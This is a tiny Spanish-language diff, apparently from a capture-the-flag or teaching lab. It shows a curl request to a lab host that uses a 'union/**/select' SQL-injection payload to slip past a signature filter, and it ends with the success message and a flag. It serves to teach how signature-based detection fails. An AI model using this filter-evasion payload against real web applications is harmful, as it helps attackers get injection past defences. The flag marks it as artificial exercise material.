@@ -1,0 +1,4 @@
+# R4 — Evasion de la firma sqli-union (comentario /**/ en lugar del espacio)
+$ curl -s "http://phantomcorp/api?q=1%20union/**/select%201,2"
+200 OK (procesado como benigno)
+Tu request ERA maliciosa pero NINGUNA firma la detectó. FLAG{signature_evaded}
